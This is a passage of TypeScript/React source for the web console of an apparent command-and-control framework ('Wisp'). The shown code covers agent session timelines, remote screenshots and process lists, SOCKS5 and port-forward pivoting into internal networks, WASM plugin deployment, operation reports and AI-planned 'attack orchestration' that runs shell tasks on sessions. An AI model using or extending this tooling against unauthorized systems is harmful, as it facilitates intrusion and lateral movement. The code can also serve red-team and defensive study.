      if (out.startsWith('{"img":"data:image')) { try { img = (JSON.parse(out) as { img: string }).img; } catch { /* raw */ } }
      const dur = (t.status === 'completed' || t.status === 'failed') && t.updated > 0 ? (t.updated - t.task.created <= 0 ? '<1s' : `${t.updated - t.task.created}s`) : t.status;
      return { ts: t.task.created, kind: 'task', icon: img ? '📷' : '⚡', title, sub: dur, ok: t.status === 'completed', img };
    }),
    ...jobs.filter((j) => j.agent === session.id).map((j): TLE => ({
      ts: j.created ?? 0, kind: 'file', icon: j.mode === 'up' ? '⬇' : '⬆', title: j.remote,
      sub: `${fmtSize(j.size)} · ${j.status}`, ok: j.status === 'done',
      href: j.status === 'done' ? `/api/files/${j.id}/download?token=${encodeURIComponent(localStorage.getItem('wisp_token') ?? '')}` : undefined,
    })),
    ...events.filter((e) => e.text.includes(session.id)).map((e): TLE => ({
      ts: Math.floor(new Date(e.time).getTime() / 1000), kind: 'event',
      icon: e.kind === 'rcp' ? '🔌' : e.kind === 'forward' ? '🔀' : e.kind === 'security' ? '🛡' : '•',
      title: e.text.replace(session.id, session.id.slice(0, 8)), sub: e.kind, ok: e.level !== 'err',
    })),
    { ts: Math.floor(new Date(session.first_seen).getTime() / 1000), kind: 'born', icon: '🎉', title: T('tlBorn'), sub: session.info.user + '@' + session.info.os },
  ].filter((x) => x.ts > 0).sort((x, y) => y.ts - x.ts).slice(0, 200);
  return (
    <div className="tabpage tl-wrap">
      <div className="tl-head">
        <b>🕘 #{session.num} {session.info.hostname}</b>
        <span className="muted">{session.info.user} · {session.info.os}/{session.info.arch} · {session.info.internal_ip}</span>
        {(session.tags ?? []).map((tg) => <span key={tg} className="tag-chip">{tg}</span>)}
      </div>
      {session.notes && <div className="tl-notes">📝 {session.notes}</div>}
      <div className="tl-feed">
        {feed.map((x, i) => (
          <div className="tl-item" key={i}>
            <span className="tl-time">{new Date(x.ts * 1000).toLocaleString([], { month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' })}</span>
            <span className={`tl-dot ${x.ok === false ? 'bad' : ''}`}>{x.icon}</span>
            <div className="tl-body">
              <div className="tl-title" title={x.title}>{x.title}</div>
              {x.sub && <div className="tl-sub">{x.sub}</div>}
              {x.img && <img className="tl-img" src={x.img} alt="" onClick={() => setZoom(x.img!)} />}
              {x.href && <a className="tl-dl" href={x.href} download>⬇</a>}
            </div>
          </div>
        ))}
        {!feed.length && <div className="empty">{T('tlEmpty')}</div>}
      </div>
      {zoom && <div className="loot-zoom" onClick={() => setZoom('')}><img src={zoom} alt="" /></div>}
    </div>
  );
}

function ProcTable({ sid }: { sid: string }) {
  const tasks = useStore((s) => s.tasks);
  const [flt, setFlt] = useState('');
  const last = tasks.filter((t) => t.session === sid && t.task.cmd === 69 && t.status === 'completed').slice(-1)[0];
  let rows: { pid: number; ppid: number; user: string; rss_kb: number; name: string }[] = [];
  try { rows = JSON.parse(last?.result?.output ?? '[]'); } catch { rows = []; }
  const lw = flt.trim().toLowerCase();
  const shown = (lw ? rows.filter((r) => r.name.toLowerCase().includes(lw) || r.user.toLowerCase().includes(lw)) : rows).slice(0, 300);
  return (
    <div className="ps-box">
      <div className="ps-hd">
        <b>📋 {T('psTitle')}</b>
        <span className="muted">{rows.length}</span>
        <input value={flt} onChange={(e) => setFlt(e.target.value)} placeholder={T('psFilterPh')} />
        <button onClick={() => void useStore.getState().dispatch(sid, 'ps', {})} title={T('psRun')}>↻</button>
      </div>
      {last ? (
        <div className="ps-scroll">
          <table className="lsn-t">
            <thead><tr><th>PID</th><th>PPID</th><th>{T('fUser')}</th><th>RSS</th><th>{T('thName')}</th></tr></thead>
            <tbody>
              {shown.map((r) => (
                <tr key={r.pid}><td className="mono">{r.pid}</td><td className="mono muted">{r.ppid}</td><td>{r.user}</td><td className="mono">{(r.rss_kb / 1024).toFixed(0)}M</td><td className="mono" title={r.name}>{r.name.slice(0, 60)}</td></tr>
              ))}
            </tbody>
          </table>
        </div>
      ) : <div className="empty" style={{ padding: 14 }}>{T('psEmpty')}</div>}
    </div>
  );
}

function ProxyMini({ sid }: { sid: string }) {
  const [rows, setRows] = useState<{ kind: string; listen: string; target?: string }[]>([]);
  useEffect(() => {
    const H = { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '' } };
    const f = () => Promise.all([fetch('/api/socks', H).then((r) => r.json()).catch(() => []), fetch('/api/forwards', H).then((r) => r.json()).catch(() => [])])
      .then(([s, fw]) => setRows([
        ...(Array.isArray(s) ? s : []).filter((x: { session: string }) => x.session === sid).map((x: { listen: string }) => ({ kind: '🌐', listen: x.listen })),
        ...(Array.isArray(fw) ? fw : []).filter((x: { session: string; status: string }) => x.session === sid && x.status === 'active').map((x: { listen: string; target: string }) => ({ kind: '🔀', listen: x.listen, target: x.target })),
      ]));
    f();
    const t = setInterval(f, 5000);
    return () => clearInterval(t);
  }, [sid]);
  return (
    <div className="px-mini">
      <b>🌐 {T('pxMini')}</b>
      {rows.map((r, i) => <span key={i} className="mono">{r.kind} {r.listen}{r.target ? ` → ${r.target}` : ''}</span>)}
      {!rows.length && <span className="muted">—</span>}
      <button onClick={() => useStore.getState().openTab('proxies', sid)}>{T('tprox')} →</button>
    </div>
  );
}

function InfoPanel({ session }: { session?: Session }) {
  const runTask = useStore((s) => s.runTask);
  const shotReq = useStore((s) => s.shotReq);
  const clearShot = useStore((s) => s.clearShot);
  const tasks = useStore((s) => s.tasks);
  const [shot, setShot] = useState('');
  const [busy, setBusy] = useState(false);
  const sys: SysDetail | null = useMemo(() => {
    const t = tasks.find((x) => x.session === session?.id && x.task.cmd === 9 && x.status === 'completed');
    if (!t?.result?.output) return null;
    try { return JSON.parse(t.result.output) as SysDetail; } catch { return null; }
  }, [tasks, session?.id]);
  const doGrab = async () => {
    if (!session) return;
    setBusy(true); setShot('');
    try {
      const t = await runTask(session.id, 'screenshot', {}, 60000);
      if (t.status !== 'completed' || !t.result?.output) throw new Error(t.result?.output ?? T('failedWord'));
      setShot((JSON.parse(t.result.output) as { img: string }).img);
    } catch (e) { setShot(''); useStore.setState({ error: String(e) }); }
    finally { setBusy(false); }
  };
  const grab = () => void doGrab();
  useEffect(() => {
    if (shotReq && shotReq === session?.id) {
      clearShot();
      void doGrab();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [shotReq, session?.id]);
  if (!session) return <div className="console"><div className="c-out muted">{T("pickSessInfo")}</div></div>;
  return (
    <div className="panel-info">
      <div className="info-grid">
        <b>Agent</b><span className="mono">{session.id}</span>
        <b>{T("fStatus")}</b><span>{session.status} · seq {session.seq} · {T("fPending")} {session.pending}</span>
        <b>{T("fHost")}</b><span>{sys?.hostname ?? session.info.hostname} · {sys?.internal_ip ?? session.info.internal_ip ?? '—'}</span>
        <b>{T("fProc")}</b><span className="mono">{sys?.process ?? session.info.process} (pid {sys?.pid ?? session.info.pid})</span>
        <b>{T("fUser")}</b><span>{sys?.user ?? session.info.user}</span>
        <b>{T("fSys")}</b><span>{session.info.os}/{session.info.arch} · agent {session.info.agent_ver}</span>
        <b>{T("agentCaps")}</b><span className="mono">{session.caps?.length ? session.caps.join(' · ') : '—'}</span>
      </div>
      <div className="info-shot">
        <button disabled={busy} onClick={grab}>{busy ? T('shotBusy') : T('shotBtn')}</button>
        <ProcTable sid={session.id} />
        <div className="meta-edit">
          <div className="meta-row">
            <label>{T('metaTags')}</label><MetaTags sid={session.id} />
            <label>{T('metaColor')}</label><MetaColor sid={session.id} />
          </div>
          <MetaNotes sid={session.id} />
        </div>
        <ProxyMini sid={session.id} />
        {shot && <img src={shot} alt="screenshot" />}
      </div>
    </div>
  );
}




function HelpOverlay({ onClose }: { onClose: () => void }) {
  const { t } = useI18n();
  useEffect(() => {
    const f = (e: KeyboardEvent) => { if (e.key === 'Escape') onClose(); };
    window.addEventListener('keydown', f);
    return () => window.removeEventListener('keydown', f);
  }, [onClose]);
  return (
    <div className="help-mask" onMouseDown={onClose}>
      <div className="help-card" onMouseDown={(e) => e.stopPropagation()}>
        <b>⌨ {t('helpTitle')}</b>
        <button className="rep-x" onClick={onClose}>✕</button>
        <div className="help-grid">
          {t('helpKeys').split('\n').map((l, i) => {
            const [k, ...d] = l.split('\t');
            return <div className="help-row" key={i}><kbd>{k}</kbd><span>{d.join(' ')}</span></div>;
          })}
        </div>
      </div>
    </div>
  );
}

function ProxyChip() {
  const [n, setN] = useState(0);
  useEffect(() => {
    const H = { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '' } };
    const f = () => Promise.all([fetch('/api/socks', H).then((r) => r.json()).catch(() => []), fetch('/api/forwards', H).then((r) => r.json()).catch(() => [])])
      .then(([s, fw]) => setN((Array.isArray(s) ? s.length : 0) + (Array.isArray(fw) ? fw.filter((x: { status: string }) => x.status === 'active').length : 0)));
    f();
    const t = setInterval(f, 10000);
    return () => clearInterval(t);
  }, []);
  if (!n) return null;
  return <div className="item sb-item" title={T('pxChipHint')} onClick={() => { useStore.getState().setView('sessions'); useStore.getState().openTab('lsn'); }}>🌐 {n}</div>;
}

function ProxiesPanel({ session }: { session?: Session }) {
  const [fw, setFw] = useState<{ id: string; listen: string; target: string; status: string }[]>([]);
  const [sk, setSk] = useState<{ id: string; listen: string; status: string }[]>([]);
  const [online, setOnline] = useState<boolean | null>(null);
  const [port, setPort] = useState('');
  const [fport, setFport] = useState('');
  const [ftarget, setFtarget] = useState('127.0.0.1:3389');
  const [msg, setMsg] = useState('');
  const H = { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json' } };
  const id = session?.id ?? '';
  const load = async () => {
    const [a2, b, st] = await Promise.all([
      fetch('/api/forwards', H).then((r) => r.json()),
      fetch('/api/socks', H).then((r) => r.json()),
      fetch(`/api/rcp/${id}/status`, H).then((r) => r.json()).catch(() => ({ online: false })),
    ]);
    setFw((Array.isArray(a2) ? a2 : []).filter((x: { session: string; status: string }) => x.session === id && x.status === 'active'));
    setSk((Array.isArray(b) ? b : []).filter((x: { session: string }) => x.session === id));
    setOnline(!!st.online);
  };
  useEffect(() => { void load(); const t = setInterval(load, 3000); return () => clearInterval(t); /* eslint-disable-next-line */ }, [id]);
  const act = async (path: string, init?: RequestInit) => {
    const r = await fetch(path, { ...H, ...init });
    if (!r.ok && r.status !== 204) setMsg(`⚠ ${(await r.json().catch(() => ({}))).error ?? r.status}`);
    else { setMsg(''); void load(); }
  };
  if (!session) return <div className="console"><div className="c-out muted">{T('pickSessionWord')}</div></div>;
  const socksLine = sk[0]?.listen;
  return (
    <div className="tabpage" style={{ padding: 16, overflowY: 'auto' }}>
      <div className="px-stats">
        <b>🌐 {T('tprox')} — #{session.num} {session.info.hostname}</b>
        <span className={`px-pill ${online ? 'on' : 'off'}`}>{online ? `● Type2 ${T('activeWord')}` : `○ Type2 ${T('t2Off')}`}</span>
        <span className="muted">{sk.length} SOCKS · {fw.length} fwd</span>
        {!online && <button className="p" onClick={() => void act(`/api/rcp/${id}/connect`, { method: 'POST' })}>🔌 {T('t2Connect')}</button>}
      </div>
      {!online && <p className="set-hint" style={{ color: 'var(--warn)' }}>{T('pxNeedT2')}</p>}
      <section>
        <h3>🌐 SOCKS5</h3>
        <p className="set-hint">{T('socksHint')}</p>
        <table className="lsn-t">
          <thead><tr><th>{T('thLocal')}</th><th>{T('thStatus')}</th><th></th></tr></thead>
          <tbody>
            {sk.map((x) => (
              <tr key={x.id}>
                <td className="mono">{x.listen}</td>
                <td><span className="c-ok">● {T('activeWord')}</span></td>
                <td className="lsn-acts">
                  <button title="socks5:// URI" onClick={() => void copy(`socks5://${x.listen}`, 'SOCKS5')}>⧉</button>
                  <button title="proxychains" onClick={() => void copy(`socks5 127.0.0.1 ${x.listen.split(':').pop()}`, 'proxychains')}>⛓</button>
                  <button title="curl" onClick={() => void copy(`curl --socks5-hostname ${x.listen} http://intranet-target`, 'curl')}>↯</button>
                  <button className="danger" onClick={() => void act(`/api/socks/${x.id}`, { method: 'DELETE' })}>{T('stopWord')}</button>
                </td>
              </tr>
            ))}
            {!sk.length && <tr><td colSpan={3} className="empty">{T('noSocks')}</td></tr>}
          </tbody>
        </table>
        <div className="lsn-new">
          <input style={{ width: 110 }} placeholder={T('pxPortPh')} value={port} onChange={(e) => setPort(e.target.value.replace(/\D/g, ''))} />
          <button className="p" disabled={!online} onClick={() => void act('/api/socks', { method: 'POST', body: JSON.stringify({ session: id, listen: port ? `127.0.0.1:${port}` : '127.0.0.1:0' }) })}>+ {T('newSocks')}</button>
          {socksLine && <span className="set-msg">proxychains4: <code>socks5 127.0.0.1 {socksLine.split(':').pop()}</code></span>}
          <span className="set-msg" style={{ color: 'var(--err)' }}>{msg}</span>
        </div>
      </section>
      <section>
        <h3>🔀 {T('mFwdLbl')}</h3>
        <p className="set-hint">{T('fwdHint')}</p>
        <table className="lsn-t">
          <thead><tr><th>{T('thLocal')}</th><th>→ {T('thTarget')}</th><th>{T('thStatus')}</th><th></th></tr></thead>
          <tbody>
            {fw.map((x) => (
              <tr key={x.id}>
                <td className="mono">{x.listen}</td>
                <td className="mono">{x.target}</td>
                <td><span className="c-ok">● {T('activeWord')}</span></td>
                <td className="lsn-acts">
                  <button onClick={() => void copy(x.listen, 'listen')}>⧉</button>
                  <button className="danger" onClick={() => void act(`/api/forwards/${x.id}`, { method: 'DELETE' })}>{T('stopWord')}</button>
                </td>
              </tr>
            ))}
            {!fw.length && <tr><td colSpan={4} className="empty">{T('noFwd')}</td></tr>}
          </tbody>
        </table>
        <div className="lsn-new">
          <input style={{ width: 200 }} placeholder="host:port" value={ftarget} onChange={(e) => setFtarget(e.target.value)} />
          <input style={{ width: 110 }} placeholder={T('pxPortPh')} value={fport} onChange={(e) => setFport(e.target.value.replace(/\D/g, ''))} />
          <button className="p" disabled={!online} onClick={() => void act('/api/forwards', { method: 'POST', body: JSON.stringify({ session: id, listen: fport ? `127.0.0.1:${fport}` : '127.0.0.1:0', target: ftarget }) })}>+ {T('newFwd')}</button>
        </div>
      </section>
    </div>
  );
}

// ================= 插件平台（plan §5） =================

interface PluginRow { ID: string; Version: string; Capabilities: string; Path: string; SHA256: string; Enabled: boolean }
interface CallRow { ts: number; agent: string; plugin: string; entry: string; result: string }

const DEMO_MANIFEST = JSON.stringify({
  id: 'demo-add', version: '1.0.0', agent: 'go', kind: 'wasm',
  entry: 'exec', capabilities: ['demo.add'], description: 'ABI v0 demo: exec(a,b)=a+b',
}, null, 2);

function PluginPanel({ onBack, asTab }: { onBack: () => void; asTab?: boolean }) {
  const { t } = useI18n();
  const [rows, setRows] = useState<PluginRow[]>([]);
  const [calls, setCalls] = useState<CallRow[]>([]);
  const [man, setMan] = useState(DEMO_MANIFEST);
  const [modB64, setModB64] = useState('');
  const [sig, setSig] = useState('');
  const [msg, setMsg] = useState('');
  const [execRes, setExecRes] = useState('');
  const H = { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json' } };

  const load = async () => {
    const [a, b] = await Promise.all([
      fetch('/api/plugins', H).then((r) => r.json()),
      fetch('/api/plugins/calls', H).then((r) => r.json()),
    ]);
    setRows(Array.isArray(a) ? a : []);
    setCalls(Array.isArray(b) ? b : []);
  };
  useEffect(() => { void load(); const t = setInterval(load, 5000); return () => clearInterval(t); /* eslint-disable-next-line */ }, []);

  const act = async (path: string, init?: RequestInit) => {
    const r = await fetch(path, { ...H, ...init });
    if (!r.ok && r.status !== 204) { setMsg(`⚠ ${(await r.json().catch(() => ({}))).error ?? r.status}`); }
    else setMsg('');
    void load();
    return r;
  };

  const install = async () => {
    if (!modB64 || !sig) { setMsg(T('needModuleSig')); return; }
    const r = await act('/api/plugins', { method: 'POST', body: JSON.stringify({ manifest: man, module_b64: modB64, sig }) });
    if (r.ok) setMsg(T('installedOk'));
  };

  const onFile = (f: File | undefined) => {
    if (!f) return;
    const rd = new FileReader();
    rd.onload = () => {
      const buf = rd.result as ArrayBuffer;
      let bin = '';
      new Uint8Array(buf).forEach((b) => { bin += String.fromCharCode(b); });
      setModB64(btoa(bin));
    };
    rd.readAsArrayBuffer(f);
  };

  const deploy = (id: string) => void act(`/api/plugins/${id}/deploy`, { method: 'POST', body: JSON.stringify({ sessions: ['online'] }) });

  const exec = async (id: string) => {
    const sess = prompt(t('execSessPh'), useStore.getState().selected);
    if (!sess) return;
    const full = useStore.getState().sessions.find((x) => x.id.startsWith(sess))?.id ?? sess;
    const r = await fetch('/api/plugins/' + id + '/exec', { ...H, method: 'POST', body: JSON.stringify({ session: full, entry: 'exec', a: 2, b: 3 }) }).then((x) => x.json());
    if (r.error) { setMsg(`⚠ ${r.error}`); return; }
    setExecRes(T('taskDispatched', { id: r.task.id, cmd: r.task.cmd }));
  };

  return (
    <div className={asTab ? 'tabpage' : 'settings'}>
      {!asTab && <div className="crumb"><b>{useI18n.getState().t('pgTitle')}</b><span className="spacer" /><button className="back" onClick={onBack}>{useI18n.getState().t('backSessions')}</button></div>}
      <div className="set-body">
        <section>
          <h3>{t('pgInstalled')}</h3>
          <table className="lsn-t">
            <thead><tr><th>{t('thPid')}</th><th>{t('thVer')}</th><th>{t('thCaps')}</th><th>{t('thSha')}</th><th>{t('pgStatus')}</th><th></th></tr></thead>
            <tbody>
              {rows.map((p) => (
                <tr key={p.ID}>
                  <td className="mono">{p.ID}</td>
                  <td>{p.Version}</td>
                  <td className="mono">{(JSON.parse(p.Capabilities || '[]') as string[]).join(', ')}</td>
                  <td className="mono muted">{p.SHA256.slice(0, 12)}…</td>
                  <td>{p.Enabled ? <span className="c-ok">{t('pgEnabled')}</span> : <span className="c-muted">{t('pgDisabled')}</span>}</td>
                  <td className="lsn-acts">
                    <button onClick={() => deploy(p.ID)}>{t('pgDeploy')}</button>
                    <button onClick={() => void exec(p.ID)}>{t('pgExec')}</button>
                    <button onClick={() => void act(`/api/plugins/${p.ID}/enable`, { method: 'POST', body: JSON.stringify({ on: !p.Enabled }) })}>{p.Enabled ? t('stopWord') : t('pgEnabled')}</button>
                    <button className="danger" onClick={() => { if (confirm(`${t('delPluginQ')} ${p.ID}?`)) void act(`/api/plugins/${p.ID}`, { method: 'DELETE' }); }}>{t('delWord')}</button>
                  </td>
                </tr>
              ))}
              {!rows.length && <tr><td colSpan={6} className="empty">{t('pgNoPlugin')}</td></tr>}
            </tbody>
          </table>
          {execRes && <p className="set-hint">{execRes}</p>}
        </section>
        <section>
          <h3>{t('pgInstall')}</h3>
          <p className="set-hint">{t('pgInstallHint')}</p>
          <textarea className="pl-man" value={man} spellCheck={false} onChange={(e) => setMan(e.target.value)} />
          <div className="lsn-new">
            <input type="file" accept=".wasm" onChange={(e) => onFile(e.target.files?.[0])} />
            <input placeholder={t('sigPh')} value={sig} onChange={(e) => setSig(e.target.value)} style={{ width: 300 }} />
            <button className="p" onClick={() => void install()}>{t('verifyInstall')}</button>
            <span className="set-msg">{msg}</span>
          </div>
          {modB64 && <p className="set-hint">{T('modLoaded', { a: modB64.length / 1.37 | 0, b: modB64.length })}</p>}
        </section>
        <section>
          <h3>{t('pgAudit')}</h3>
          <table className="lsn-t">
            <thead><tr><th>{t('thTime')}</th><th>{t('thSession')}</th><th>{t('thPlugin')}</th><th>{t('thOp')}</th><th>{t('thResult')}</th></tr></thead>
            <tbody>{calls.slice(0, 12).map((c, i) => (
              <tr key={i}><td>{new Date(c.ts * 1000).toLocaleTimeString()}</td><td className="mono">{c.agent.slice(0, 8)}</td><td>{c.plugin}</td><td>{c.entry}</td><td>{c.result}</td></tr>
            ))}</tbody>
          </table>
        </section>
      </div>
    </div>
  );
}


// ================= 行动报告（M6.5） =================

interface ReportMeta { id: string; project: string; title: string; model: string; created: number }

// minimal, safe markdown renderer: escape first, then structural transforms
function md2html(src: string): string {
  const esc = src.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  const lines = esc.split('\n');
  const out: string[] = [];
  let inTable = false, inList = false;
  const closeAll = () => {
    if (inTable) { out.push('</table>'); inTable = false; }
    if (inList) { out.push('</ul>'); inList = false; }
  };
  const inline = (t: string) => t
    .replace(/!\[([^\]]*)\]\(([^)\s]+)\)/g, '<img class="rep-img" src="$2" alt="$1"/>')
    .replace(/\*\*(.+?)\*\*/g, '<b>$1</b>')
    .replace(/`(.+?)`/g, '<code>$1</code>')
    .replace(/^(\s*)- /, '$1• ');
  for (const raw of lines) {
    const l = raw.trimEnd();
    if (/^\|/.test(l)) {
      if (/^\|[\s:|-]+\|$/.test(l.replace(/-/g, '-'))) if (/^\|[ :-]+\|$/.test(l)) continue;
      const cells = l.replace(/^\||\|$/g, '').split('|').map((c) => c.trim());
      if (!inTable) { closeAll(); out.push('<table class="md-t">'); inTable = true; out.push('<tr>' + cells.map((c) => `<th>${inline(c)}</th>`).join('') + '</tr>'); }
      else out.push('<tr>' + cells.map((c) => `<td>${inline(c)}</td>`).join('') + '</tr>');
      continue;
    }
    closeAll();
    if (/^### /.test(l)) out.push(`<h4>${inline(l.slice(4))}</h4>`);
    else if (/^## /.test(l)) out.push(`<h3>${inline(l.slice(3))}</h3>`);
    else if (/^# /.test(l)) out.push(`<h2>${inline(l.slice(2))}</h2>`);
    else if (/^---+$/.test(l)) out.push('<hr/>');
    else if (/^• /.test(inline(l))) { if (!inList) { out.push('<ul>'); inList = true; } out.push(`<li>${inline(l).slice(2)}</li>`); }
    else if (l.trim()) out.push(`<p>${inline(l)}</p>`);
    else if (inList) { out.push('</ul>'); inList = false; }
  }
  closeAll();
  return out.join('');
}

function ReportPanel({ asTab }: { asTab?: boolean }) {
  const { t } = useI18n();
  const [rows, setRows] = useState<ReportMeta[]>([]);
  const [cur, setCur] = useState<ReportMeta | null>(null);
  const [html, setHtml] = useState('');
  const [busy, setBusy] = useState('');
  const H = { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json' } };
  const load = () => { const p = useStore.getState().project; return fetch(`/api/reports${p ? `?project=${encodeURIComponent(p)}` : ''}`, H).then((r) => r.json()).then((x) => setRows(Array.isArray(x) ? x : [])).catch(() => {}); };
  useEffect(() => { void load(); }, []);
  const gen = async (ai: boolean) => {
    setBusy(ai ? t('repGenAI') : t('repGen'));
    const r = await fetch('/api/reports', { ...H, method: 'POST', body: JSON.stringify({ project: useStore.getState().project || 'default', ai }) }).then((x) => x.json()).catch(() => ({}));
    setBusy('');
    if (r.id) { await load(); void view(r.id); useStore.getState().toast({ kind: 'ok', text: t('toastReportOk').replace('{m}', r.model) }); }
    else useStore.getState().toast({ kind: 'err', text: t('reportFail').replace('{e}', r.error ?? '') });
  };
  const view = async (id: string) => {
    const r = await fetch(`/api/reports/${id}`, H).then((x) => x.json()).catch(() => null);
    if (r) { setCur(r); setHtml(md2html(r.markdown ?? '')); }
  };
  const del = async (id: string) => {
    if (!confirm(t('delReport'))) return;
    await fetch(`/api/reports/${id}`, { ...H, method: 'DELETE' });
    if (cur?.id === id) { setCur(null); setHtml(''); }
    void load();
  };
  return (
    <div className={asTab ? 'tabpage' : 'settings'}>
      <div className="set-body">
        <section>
          <h3>{t('repTitle')}</h3>
          <p className="set-hint">{t('repHint')}</p>
          <div className="lsn-new">
            <button className="p" disabled={!!busy} onClick={() => void gen(false)}>{t('repTpl')}</button>
            <button disabled={!!busy} onClick={() => void gen(true)}>{t('repAI')}</button>
            {busy && <span className="set-msg">{busy}</span>}
          </div>
        </section>
        <section className="rep-grid">
          <div className="rep-list">
            {rows.map((r) => (
              <div key={r.id} className={`rep-item${cur?.id === r.id ? ' on' : ''}`} onClick={() => void view(r.id)}>
                <span>{new Date(r.created * 1000).toLocaleString()}<i>{r.model}</i></span>
                <button className="rep-x" onClick={(e) => { e.stopPropagation(); void del(r.id); }}>✕</button>
              </div>
            ))}
            {!rows.length && <div className="empty">{t('repNone')}</div>}
          </div>
          <div className="rep-view">
            {cur ? (
              <>
                <div className="rep-bar">
                  <span>{cur.title}</span>
                  <a href={`/api/reports/${cur.id}?raw=md&token=${encodeURIComponent(localStorage.getItem('wisp_token') ?? '')}`} download>{t('repDownload')}</a>
                </div>
                <div className="rep-md" dangerouslySetInnerHTML={{ __html: html }} />
              </>
            ) : <div className="empty" style={{ padding: 30 }}>{t('repPick')}</div>}
          </div>
        </section>
      </div>
    </div>
  );
}


// ================= 攻击编排（M6.5-2） =================

interface GoalMeta { id: string; project: string; title: string; status: string; created: number }
interface GoalStep { id: string; seq: number; name: string; kind: string; args: string; status: string; result: string }

const STEP_ICON: Record<string, string> = { task: '⚡', plugin: '🧩', gate: '🛡', wait: '⏱', note: '📝' };


function StepInspector({ step, editable, onSave, del }: {
  step: GoalStep; editable: boolean;
  onSave: (patch: { name?: string; args?: Record<string, unknown> }) => Promise<void> | void;
  del: () => void;
}) {
  const [name, setName] = useState(step.name);
  const [args, setArgs] = useState<Record<string, string>>(() => {
    try { const o = JSON.parse(step.args || '{}'); const r: Record<string, string> = {}; for (const [k, v] of Object.entries(o)) r[k] = String(v); return r; } catch { return {}; }
  });
  const set = (k: string) => (e: React.ChangeEvent<HTMLInputElement>) => setArgs((a) => ({ ...a, [k]: e.target.value }));
  const fields: Record<string, string[]> = { task: ['session', 'cmd', 'command'], plugin: ['session', 'plugin', 'a', 'b'], wait: ['seconds'], gate: [], note: [] };
  const dirty = name !== step.name || JSON.stringify(args) !== JSON.stringify(Object.fromEntries(Object.entries(args).map(([k, v]) => [k, v])));
  void dirty;
  return (
    <div className="insp">
      <span className="insp-k">{STEP_ICON[step.kind] ?? '•'} {step.kind}</span>
      <input value={name} disabled={!editable} onChange={(e) => setName(e.target.value)} placeholder={T('insName')} />
      {(fields[step.kind] ?? []).map((f) => <input key={f} value={args[f] ?? ''} disabled={!editable} onChange={set(f)} placeholder={f} className="mono" />)}
      {editable && <button className="p" disabled={!name} onClick={() => void onSave({ name, args })}>💾 {T('insSave')}</button>}
      {editable && <button className="danger" onClick={del}>✕</button>}
      {!editable && <span className="insp-ro">{T('insLocked')}</span>}
    </div>
  );
}

function GoalPanel({ asTab }: { asTab?: boolean }) {
  const { t } = useI18n();
  const [goals, setGoals] = useState<GoalMeta[]>([]);
  const [cur, setCur] = useState<string>('');
  const [steps, setSteps] = useState<GoalStep[]>([]);
  const [goalMeta, setGoalMeta] = useState<GoalMeta | null>(null);
  const [goalPrompt, setGoalPrompt] = useState('');
  const [planSteps, setPlanSteps] = useState<unknown[] | null>(null);
  const [busy, setBusy] = useState('');
  const [sel, setSel] = useState<string | null>(null);
  const goalTick = useStore((x) => x.goalTick);
  const sessions = useStore((s) => s.sessions);
  const H = { headers: { 'X-Wisp-Token': localStorage.getItem('wisp_token') ?? '', 'Content-Type': 'application/json' } };

  const loadGoals = async () => {
    const g = await fetch(`/api/goals${useStore.getState().project ? `?project=${encodeURIComponent(useStore.getState().project)}` : ''}`, H).then((r) => r.json()).catch(() => []);
    setGoals(Array.isArray(g) ? g : []);
    if (!cur && g.length) void openGoal(g[0].id);
  };
  const openGoal = async (id: string) => {
    setCur(id);
    const d = await fetch(`/api/goals/${id}`, H).then((r) => r.json()).catch(() => null);
    if (d) { setSteps(d.steps ?? []); setGoalMeta(d.goal); }
  };
  useEffect(() => {
    void loadGoals();
    const t = setInterval(() => { void loadGoals(); if (cur) void openGoal(cur); }, 6000);
    return () => clearInterval(t);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [cur]);
  useEffect(() => { if (cur) void openGoal(cur); /* eslint-disable-next-line */ }, [goalTick]);

  const post = (path: string, body?: unknown, method = 'POST') => fetch(path, { ...H, method, body: body ? JSON.stringify(body) : undefined });

  const aiPlan = async () => {
    if (!goalPrompt.trim()) return;
    setBusy(t('goalPlanning')); setPlanSteps(null);
    const r = await post('/api/goals/plan', { prompt: goalPrompt }).then((x) => x.json());
    setBusy('');
    if (r.error) { useStore.getState().toast({ kind: 'err', text: r.error }); return; }
    setPlanSteps(r.steps);
  };

  const savePlan = async () => {
    if (!planSteps?.length) return;
    await post('/api/goals', { project: useStore.getState().project || 'default', title: goalPrompt.slice(0, 40) || T('aiPlanDefault'), steps: planSteps });
    setPlanSteps(null); setGoalPrompt('');
    void loadGoals();
    useStore.getState().toast({ kind: 'ok', text: t('tGoalOk') });
  };

  const addManual = async () => {
    const title = window.prompt(t('goalTitle'), t('goalTitle') + ' ' + new Date().toLocaleTimeString());
    if (!title) return;
    await post('/api/goals', { project: useStore.getState().project || 'default', title, steps: [] });
    void loadGoals();
  };

  const addStep = async (kind: string) => {
    if (!cur) return;
    const name = window.prompt(t('thName'), kind === 'task' ? t('mOpenShell') : kind);
    if (name === null) return;
    let sp: Record<string, unknown> = { name, kind };
    if (kind === 'task') {
      const sess = window.prompt(t('thSession') + ' (id/prefix)', sessions[0]?.id.slice(0, 8) ?? '');
      const command = window.prompt('shell | sysinfo | pwd', 'whoami');
      if (!sess || !command) return;
      if (['shell', 'sysinfo', 'pwd'].includes(command.trim())) sp = { ...sp, session: sess, cmd: command.trim() };
      else sp = { ...sp, session: sess, cmd: 'shell', command };
    } else if (kind === 'plugin') {
      const sess = window.prompt(t('thSession'), sessions[0]?.id.slice(0, 8) ?? '');
      const pid = window.prompt(t('thPid'), 'demo-add');
      const ab = window.prompt('a,b', '2,3');
      if (!sess || !pid || !ab) return;
      const [a, b] = ab.split(',');
      sp = { ...sp, session: sess, plugin: pid, a: +a, b: +b };
    } else if (kind === 'wait') {
      const sec = window.prompt(t('kWait') + ' (s)', '5');
      if (!sec) return;
      sp = { ...sp, seconds: +sec };
    }
    await post(`/api/goals/${cur}/steps`, sp);
    void openGoal(cur);
  };

  const gate = async (id: string, approve: boolean) => {
    await post(`/api/steps/${id}/decide`, { approve });
    void openGoal(cur);
  };

